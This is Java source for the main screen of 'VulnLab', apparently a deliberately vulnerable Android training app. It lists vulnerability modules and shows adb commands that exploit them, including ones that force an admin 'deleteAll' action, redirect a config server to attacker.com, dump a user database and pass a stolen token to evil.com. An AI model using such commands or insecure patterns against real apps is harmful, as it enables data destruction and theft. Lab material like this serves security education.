package com.vulnlab.insecureapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

/**
 * VulnLab — Main Activity
 * Provides navigation to all vulnerable components.
 * Package: com.vulnlab.insecureapp
 *
 * Manifest-level vulnerabilities visible here:
 *   - android:debuggable="true"
 *   - android:allowBackup="true"
 *   - android:usesCleartextTraffic="true"
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("VulnLab — Vulnerable Android App\n\nFor security research & education only.\nAll vulnerabilities are intentional.\n");
        title.setTextSize(14);
        ll.addView(title);

        addButton(ll, "11.1 — Component Exposure (AdminActivity)", AdminActivity.class);
        addButton(ll, "11.2 — Intent Redirect (BroadcastReceiver)", null); // triggered via adb
        addButton(ll, "11.2 — PendingIntent Misuse", PendingIntentActivity.class);
        addButton(ll, "11.3 — ContentProvider (SQL injection)", null);
        addButton(ll, "11.4 — Deep Link Handler", DeepLinkActivity.class);
        addButton(ll, "11.5 — Config Broadcast Receiver", null); // triggered via adb
        addButton(ll, "11.6 — Insecure Data Storage", StorageActivity.class);
        addButton(ll, "11.7 — Cryptography Failures", CryptoActivity.class);
        addButton(ll, "11.8 — Insecure WebView", WebViewActivity.class);
        addButton(ll, "11.9 — Dynamic Code Loading", DynamicCodeActivity.class);

        TextView notes = new TextView(this);
        notes.setText("\nADB test commands:\n" +
            "adb shell am start -n com.vulnlab.insecureapp/.AdminActivity --ez isAdmin true --es action deleteAll\n\n" +
            "adb shell am broadcast -a com.vulnlab.insecureapp.ACTION_UPDATE_CONFIG --es server_url http://attacker.com\n\n" +
            "adb shell content query --uri content://com.vulnlab.insecureapp.provider/users\n\n" +
            "adb shell am start -a android.intent.action.VIEW -d 'vulnlab://app/reset?token=STOLEN&redirect=http://evil.com'\n");
        notes.setTextSize(10);
        ll.addView(notes);

        sv.addView(ll);
        setContentView(sv);
    }

    private void addButton(LinearLayout ll, String label, final Class<?> target) {
        Button btn = new Button(this);
        btn.setText(label);
        btn.setTextSize(11);
        if (target != null) {
            btn.setOnClickListener(new NavClickListener(this, target));
        }
        ll.addView(btn);
    }

    /** Named static listener to avoid d8 bug with anonymous inner classes. */
    static class NavClickListener implements View.OnClickListener {
        private final MainActivity activity;
        private final Class<?> target;
        NavClickListener(MainActivity a, Class<?> t) { activity = a; target = t; }

        @Override
        public void onClick(View v) {
            activity.startActivity(new Intent(activity, target));
        }
    }
}
